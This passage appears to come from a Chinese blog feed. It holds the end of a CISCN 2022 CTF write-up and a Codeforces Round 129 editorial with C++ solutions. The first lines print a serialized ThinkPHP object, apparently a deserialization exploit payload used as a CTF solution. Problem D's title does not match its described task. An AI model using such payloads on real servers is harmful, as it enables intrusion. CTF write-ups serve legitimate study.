class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span>(<span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>()))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="baby-tree"><a href="#baby-tree" class="headerlink" title="baby_tree"></a>baby_tree</h3><p>直接看ast，assign_expr是赋值语句，binary_expr里面decl=后面是运算符，argument_list里的两个argument参与运算，分析一下主要逻辑，写出对应的解密脚本。</p><p>脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[] = &#123;<span class="number">88</span>, <span class="number">35</span>, <span class="number">88</span>, <span class="number">225</span>, <span class="number">7</span>, <span class="number">201</span>, <span class="number">57</span>, <span class="number">94</span>, <span class="number">77</span>, <span class="number">56</span>, <span class="number">75</span>, <span class="number">168</span>, <span class="number">72</span>, <span class="number">218</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">16</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">207</span>, <span class="number">73</span>, <span class="number">130</span>, <span class="number">74</span>, <span class="number">128</span>, <span class="number">76</span>, <span class="number">201</span>, <span class="number">16</span>, <span class="number">248</span>, <span class="number">41</span>, <span class="number">205</span>, <span class="number">103</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">99</span>, <span class="number">79</span>, <span class="number">202</span>, <span class="number">22</span>, <span class="number">131</span>, <span class="number">63</span>, <span class="number">255</span>, <span class="number">20</span>, <span class="number">16</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> k[] = <span class="string">&quot;345y&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span> - <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = k[<span class="number">0</span>];</span><br><span class="line">        k[<span class="number">0</span>] = k[<span class="number">1</span>];</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">2</span>];</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">3</span>];</span><br><span class="line">        k[<span class="number">3</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">42</span> - <span class="number">4</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> r0 = b[i + <span class="number">0</span>], r1 = b[i + <span class="number">1</span>], r2 = b[i + <span class="number">2</span>], r3 = b[i + <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = k[<span class="number">3</span>];</span><br><span class="line">        k[<span class="number">3</span>] = k[<span class="number">2</span>];</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">1</span>];</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">0</span>];</span><br><span class="line">        k[<span class="number">0</span>] = tmp;</span><br><span class="line">        b[i + <span class="number">0</span>] = r2 ^ k[<span class="number">2</span>];</span><br><span class="line">        b[i + <span class="number">1</span>] = r3 ^ k[<span class="number">3</span>];</span><br><span class="line">        b[i + <span class="number">2</span>] = ((k[<span class="number">0</span>] + (b[i + <span class="number">0</span>] &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xff</span>) ^ r0;</span><br><span class="line">        b[i + <span class="number">3</span>] = ((k[<span class="number">1</span>] + (b[i + <span class="number">1</span>] &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0xff</span>) ^ r1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的程序拿到flag</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="everlasting-night"><a href="#everlasting-night" class="headerlink" title="everlasting_night"></a>everlasting_night</h3><p>本来以为不是lsb隐写（因为隐藏字母太小太犄角旮旯了没看见），查看属性无信息获取</p><p>拉入010editor中查看png的文件头和文件尾，发现文件尾后面有一段多出来的字符，不知道是做什么的，先放着</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653813046204.png" alt="1653813046204"></p><p>题目提示含lsb隐写后，拉入Stegsolve查看，终于在Alpha2处发现右下角有猫腻</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653821873989.png" alt="1653821873989"></p><p>但是分析并没有得出信息，坚信信息就隐藏在这里，查阅字典发现row译为中文是行，column是柱，猜测可能是因为右下角的信息是一列的，而我刚开始查看是以行查看，修改成功数据后发现隐藏文本</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653813260877.png" alt="1653813260877"></p><p>拿到这串数字后第一反应使用lsb的工具</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824152028.png" alt="1653824152028"></p><p>拿到一个文本文件，拉入010查看发现是压缩包文件头，果断修改后缀名为rar</p><p>但是解压需要密码，猜测开头在文件尾后的那一串是密码，但是输入后发现不是，猜测可能是某种加密，广泛尝试后发现是md5隐写</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653817094602.png" alt="1653817094602">解压后得到一个没有后缀的flag文件</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653822607451.png" alt="1653822607451"></p><p>拉入010发现是PNG文件，本来想通过改后缀名拿到答案，后来发现还是太天真</p><p>使用ps和画图打开无果，想到gimp，将文件后缀名改为data后用gimp打开</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824657534.png" alt="1653824657534"></p><p>发现图片有些怪怪的，本来想拼图找一下flag，但是实在考验眼力，于是尝试修改各种数值，发现猫腻出在宽度上</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824747017.png" alt="1653824747017"></p><p>拿到答案，提交</p><h3 id="ez-usb"><a href="#ez-usb" class="headerlink" title="ez_usb"></a>ez_usb</h3><p>使用 wireshark 打开发现是 usb 键盘流量</p><p>有两个不同的 usb.addr 发送数据，分别将其保存到两个不同的流量包</p><p>用键盘流量分析工具对其提取数据：<a href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a></p><p>发现有一个 <code>rar</code> 文件，一个 <code>35c535765e50074a</code>，打开rar文件发现需要密码，应该另一串字符就是密码，输入成功拿到 <code>flag</code> 文件</p><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>填个问卷而已</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CISCN </category>
          
          <category> 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Educational Coeforces Round 129(Div.2)题解</title>
      <link href="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/"/>
      <url>/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/</url>
      
        <content type="html"><![CDATA[<p>这波 <code>div2</code> 上大分，写波题解。</p><p>实况录屏<a href="https://www.bilibili.com/video/BV1RS4y1B7g3">在这</a></p><span id="more"></span><h2 id="A-Game-with-Cards"><a href="#A-Game-with-Cards" class="headerlink" title="A. Game with Cards"></a>A. Game with Cards</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目的意思就是说，<code>Alice</code> 和 <code>Bob</code> 分别有 <code>n,m</code> 张牌，然后每次出牌不能小于等于上一次的出牌，如果到自己的回合却不能出牌则判负，问如果两人分别先手，谁会赢？这个稍微想一下就能发现我一开始出最大的一定是最优的策略，比的就是最大值谁最大，假设相等那我肯定出最大的那个我必赢，所以无脑比最大就是这题的思路，如果相等那么谁先手谁赢，所以这里就分三种情况：</p><ol><li><code>max1&gt;max2</code>：<code>Alice</code>必赢</li><li><code>max1&lt;max2</code>：<code>Bob</code>必赢</li><li><code>max1==max2</code>：谁先手谁赢</li></ol><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> max1=<span class="number">0</span>,max2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        max1=<span class="built_in">max</span>(max1,x);</span><br><span class="line">    &#125;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        max2=<span class="built_in">max</span>(max2,x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(max1&gt;max2)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alice\nAlice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max1&lt;max2)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bob\nBob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alice\nBob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Card-Trick"><a href="#B-Card-Trick" class="headerlink" title="B. Card Trick"></a>B. Card Trick</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>一个以前经常玩的魔术，就是假装洗牌，实则那张牌在哪里记得清清楚楚。给一个序列，每次操作会把前 <code>k</code> 个值移动到最后去。问经过若干次操作之后第一个牌的值是多少，不难发现如果进行一次操作相当于第 <code>k+1</code> 张牌会变成第一张牌，因为是直接移动，不改变顺序，所以不难想到改题目就是统计所有的操作次数最后对 <code>n</code> 取模得到的下标就是第一张牌的位置。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x,op,ans=<span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cin&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=x;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;op);</span><br><span class="line">        ans+=op;</span><br><span class="line">        ans%=n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a[ans+<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Double-Sort"><a href="#C-Double-Sort" class="headerlink" title="C. Double Sort"></a>C. Double Sort</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>给两个序列，每次一起交换，问最后能否交换成都不递减，且若能则输出交换次数最少的方案。我们直接定义结构体存储两个序列的值再重载小于号，让它严格按 <code>a</code> 递增，相等的情况按 <code>b</code>递增，因为交换次数最少，不难想到用选择排序可以达到交换次数最少的目的。那么我们就先排个序，然后判断 <code>b</code> 的值是否不递减就可以了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//int a[maxn];</span></span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">in</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> A &amp;q)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a==q.a)&#123;</span><br><span class="line">            <span class="keyword">return</span> b&lt;q.b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a&lt;q.a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;a[maxn]; </span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;ans;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;().<span class="built_in">swap</span>(ans);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> idx=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[idx])&#123;</span><br><span class="line">                idx=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(idx!=i)&#123;</span><br><span class="line">            ans.<span class="built_in">push</span>(&#123;idx,i&#125;);</span><br><span class="line">            <span class="built_in">swap</span>(a[i],a[idx]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i<span class="number">-1</span>].b&gt;a[i].b)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">while</span>(ans.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=ans.<span class="built_in">front</span>();</span><br><span class="line">        ans.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,x.first,x.second);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Colorful-Stamp"><a href="#D-Colorful-Stamp" class="headerlink" title="D. Colorful Stamp"></a>D. Colorful Stamp</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>这个题，就是说对一个数进行操作，每次可以把这个数的十进制某一位作为乘数乘这个数，即为一次操作。问你最小操作次数使这个数变成十进制 <code>n</code> 位。</p><p>这个题的话就直接无脑广搜就好了。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int unsigned long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> target=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">40</span>;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    q.<span class="built_in">push</span>(&#123;now,<span class="number">0</span>&#125;);</span><br><span class="line">    <span class="keyword">bool</span> used[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        cnt++;</span><br><span class="line">        <span class="built_in">memset</span>(used,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(used));</span><br><span class="line">        <span class="keyword">int</span> num=q.<span class="built_in">front</span>().first;</span><br><span class="line">        <span class="keyword">int</span> step=q.<span class="built_in">front</span>().second;</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> m=num;</span><br><span class="line">        <span class="keyword">if</span>(num&gt;=target)&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;%lld\n&quot;,cnt);</span></span><br><span class="line">            <span class="keyword">return</span> step;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(m)&#123;</span><br><span class="line">            <span class="keyword">int</span> p=m%<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(p!=<span class="number">0</span>&amp;&amp;p!=<span class="number">1</span>&amp;&amp;!used[p])&#123;</span><br><span class="line">                used[p]=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(ma[p*num]==<span class="number">1</span>)<span class="keyword">continue</span>;</span><br><span class="line">                ma[p*num]=<span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(&#123;p*num,step+<span class="number">1</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            m/=<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span 